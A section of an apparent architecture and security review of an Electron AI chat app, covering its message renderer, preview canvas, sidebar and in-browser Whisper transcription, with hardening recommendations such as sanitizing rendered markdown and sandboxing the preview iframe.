  - Assistant: logo + `<ThinkingBlock>` (if any) + `<ToolCallView>`s + main markdown body + `<ActivityBar>` + hover-revealed Regenerate/Copy buttons.
  - Markdown rendering: `marked.parse(parsed.visible, { breaks: true })` → injected via React's raw-HTML escape hatch. **HTML-injection surface** (see below).
  - Streaming cursor (`▍`) appended via the same raw-HTML path.
- **`ThinkingBlock`** (lines 229–260): collapsible, defaults open while in-progress, closed when done. Shimmer text on the label while thinking.
- **`ToolCallView`** (lines 317–385): per-call card with icon, verb, target, expandable args/result/error. `write_file` calls show the first 4KB of content in a `<pre>`; other calls show JSON.stringify'd args truncated to 400 chars.
- **`ActivityBar`** (lines 132–193): rotates labels every 3.5s through `THINKING_VERBS` / `GENERATING_VERBS`. Shows char count + elapsed time. **Suppresses itself if there's a running tool card showing the same state** (line 181) — avoids double-status.
- **`toolVerb`, `toolLabel`, `toolIcon`** (lines 195–315): three switch statements mapping the 10 tools to display labels. Adding a new tool means adding entries to all three.

### Markdown HTML-injection surface

`marked v15` is generally safe by default (escapes attribute injection and doesn't allow `<script>` tags). Combined with the CSP's `script-src 'self' 'wasm-unsafe-eval' blob:` (which forbids inline scripts), the surface is small.

But: the model controls the markdown content. If marked's defaults ever change, or a markdown parser CVE lands, the chat surface becomes the attack vector. Captured for §Hardening — consider passing the parsed HTML through DOMPurify before injection. Adds ~5 KB to the bundle; eliminates the class of risk.

### Coupling to tools.ts

Three switch statements in this file (`toolVerb`, `toolLabel`, `toolIcon`) plus the per-tool special-cases (e.g., `write_file` content preview) all encode tool names. Adding a new tool means edits to (a) `tools.ts:TOOLS`, (b) at least these three switches, and (c) `Chat.tsx` if any chunk handling is specific.

For the Skills extension: every Skill that registers a new tool needs corresponding display metadata (label, icon, verb). The clean refactor would be to attach `displayVerb`, `displayIcon`, etc. to `ToolSpec` itself, so the renderer can render unknown tools generically and known tools with their custom presentation. Captured for §Hardening as the natural prep work for Skills.

---

## 8.3 Canvas.tsx — Preview / Code / Files

**Purpose:** The right-pane Build tab. Three sub-tabs:
- **Preview**: iframe to the workspace HTTP server (§5.3). Cache-busted via `?v=${nonce}` query param.
- **Code**: live-streaming view of whatever file is currently being written (via `file:streaming` IPC). Line-numbered, monospace, auto-scroll-to-bottom unless user scrolled up.
- **Files**: indented file tree from `api.listWorkspace`. Click to set as preview source.

### State

- `tab: 'preview' | 'files' | 'code'`.
- `port: number` — workspace server port (fetched once on mount via `api.workspaceServerPort()`).
- `files: WorkspaceFile[]`.
- `selectedFile: string | null` — when set, preview shows that file specifically; otherwise the workspace root (renders `index.html` if present).
- `nonce: number` — cache-busting counter, bumped on workspace changes and refresh clicks.
- `liveFile: { path, content, done } | null` — current write_file streaming state.
- `autoSwitched: boolean` — has the auto-tab-switch fired this round.

### Behavior highlights

- **Tab auto-switching during streaming**: when `file:streaming` arrives and `!autoSwitched`, switch to Code tab. When `done:true` arrives, wait 1400ms, then switch back to Preview. **This is the live-typing demo experience** — the user sees the code appearing, then the rendered result.
- **Iframe reload debounce**: `workspace:changed` events trigger a 350ms-debounced `nonce++`, causing the iframe to reload with a new cache-busting URL. Without the debounce, rapid-fire workspace changes (e.g., during code-mode tool-heavy rounds) would cause iframe thrashing.
- **`refreshFiles()`** (lines 76–83): calls `api.listWorkspace(conversationId)`, swallows errors to `[]`. Called on conversation change, on workspace:changed, and never explicitly otherwise — file list can go stale if the user opens the workspace in Finder and adds/removes files (no file watcher, see §5 finding).
- **Open Workspace Folder** button calls `api.openWorkspace(conversationId)` → `shell.openPath(workspaceDir(conversationId))`. Useful escape hatch.
- **Code view's `userScrolledRef`** (lines 197–207): tracks whether the user has scrolled up from the bottom. If they have, don't auto-scroll. Same discipline as Chat's MessageList.

### IPC consumed

- `workspaceServerPort` (one-shot on mount)
- `listWorkspace` (on mount, on conversation change, on workspace changed)
- `openWorkspace` (button click)
- `onWorkspaceChanged` subscription (lifetime of the component)
- `onFileStreaming` subscription (lifetime of the component)

### Notable

- **`previewSrc` URL** (lines 85–90): `http://127.0.0.1:${port}/${encodeURIComponent(conversationId)}/${path}?v=${nonce}`. The `encodeURIComponent` on conversationId is correct defense (the workspace server's `sanitizeId` does the actual safety enforcement on the server side; encoding here is for URL well-formedness).
- **Iframe sandbox attribute is not set.** The CSP's `frame-src http://127.0.0.1:*` restricts the *source* of frames, but the loaded content runs without `sandbox` attribute restrictions. The previewed code runs in a separate origin (different port, with the workspace server's permissive CORS), but it has access to localhost network and any `data:` URIs. Low-risk because the content is the user's own generated files, but captured for §Hardening — add `sandbox="allow-scripts allow-same-origin"` if we ever serve any third-party content here.

---

## 8.4 Sidebar.tsx — conversation list

**Purpose:** Left rail. New Chat button, conversation list, "Running locally" + author footer.

**81 lines, mostly markup.** Three observations:

1. **Drag region at top** (`drag` class on the outer div) — the macOS title bar drag area.
2. **Delete confirmation uses `confirm()`** (line 52). Per the global instructions, modal dialogs in Electron renderers block the renderer event loop, which is generally fine for confirm but worth noting — if you ever ship a Skill that needs to react to delete events, that dialog being open blocks IPC handling.
3. **Hard-coded `@ammaar` footer link** (lines 69–76) — upstream attribution, target=_blank, opens via `shell.openExternal` (correct per §2.2's `setWindowOpenHandler`). Captured as one of the upstream-drift markers from §1.

---

## 8.5 lib/whisper.ts — in-browser speech recognition

**Purpose:** The actual implementation of the voice feature. Loads a Whisper model via `@huggingface/transformers` (transformers.js), runs inference entirely in the renderer using WebGPU (with WASM fallback).

### Configuration

- **`env.allowLocalModels = false`** — model must be downloaded from HF, not loaded from a local file path.
- **`env.useBrowserCache = true`** — caches the downloaded model in the browser's IndexedDB. First voice use takes 30+ seconds; subsequent uses are instant.
- **Model: `onnx-community/whisper-base.en`** — English-only Whisper Base. Comment (lines 10–11) explains the choice: avoids a known broken int4 quantization in Xenova's older `whisper-tiny.en`. **English-only** is a real limitation — non-English voice input would transcribe to garbage. Captured for §Hardening as a (small) capability ceiling.
- **`dtype: { encoder_model: 'fp32', decoder_model_merged: 'q8' }`** — full precision encoder, 8-bit quantized decoder. Reasonable balance.

### `getTranscriber(onProgress)` (lines 14–40)

- Singleton pipeline cached in `pipelinePromise`. First call creates it; subsequent calls return the cached promise.
- Tries WebGPU first; on failure, falls back to WASM. Logs the WebGPU error. **WASM fallback works on every modern browser** but is meaningfully slower (10-30x slower depending on hardware).
- Progress callback forwarded to consumer for the model download phase.

### `transcribeAudioBlob(blob, onProgress)` (lines 48–75)

1. **Decode the audio blob** via `AudioContext({ sampleRate: 16000 })`.
2. **Mix to mono** if needed (`mixToMono` — sums channels, divides by N).
3. **Resample to 16 kHz** if the AudioContext didn't honor the target rate (some browsers, notably Safari, ignore the `sampleRate` constructor option). `resampleLinear` does linear interpolation. Good-enough for speech.
4. **Run the transcriber** with `chunk_length_s: 30, stride_length_s: 5` — standard Whisper chunking parameters for long-form audio.
5. **Concatenate results** (Whisper may return an array for multi-chunk audio) and trim.

### Integration

Only called from `Composer.tsx:startRecording → rec.onstop`. No other call sites. The `setTranscriberModel` exported function (lines 42–46) for swapping models is unused in the codebase — dead export. Captured for §Hardening cleanup or for retention if we plan to support model swapping in UI.

## §8 Synthesis

1. **Voice transcription works and is good.** The IPC stub was misleading; the actual implementation is solid (transformers.js + WebGPU). The dead IPC channel should be removed; the feature should stay.
2. **transformers.js capability is broader than just whisper.** The renderer can run any HF model that has an ONNX export and fits in memory. Useful primitive for future features (in-renderer embeddings, classification, reranking) that don't need the MLX subprocess.
3. **Message rendering has a small HTML-injection surface via the marked output path.** Mitigated by CSP and marked's defaults. Adding DOMPurify is cheap insurance — captured for §Hardening.
4. **Adding a new tool means editing three switches in Message.tsx plus tools.ts.** For Skills extensibility, lift display metadata (verb, icon, label-generator) onto `ToolSpec` itself so unknown tools render generically and known tools render with their own metadata. The natural prep work for Skills.
5. **Canvas's live-tab-switching behavior is a real UX win.** Auto-Code-while-streaming, auto-Preview-when-done — preserve this as we evolve.
6. **No file watcher means the Files tab can go stale.** Same finding from §5; surfaces here because Files is where the user notices.
7. **All upstream attribution drift markers from §1 are visible in actual UI:** the `@ammaar` Sidebar link, the (no longer accurate) Welcome screen copy, the package metadata. Cosmetic but visible.

Section 8 complete. Section 9 (cross-cutting synthesis) is the close-out.

---

## (Section 9 will be the final cross-cutting synthesis.)
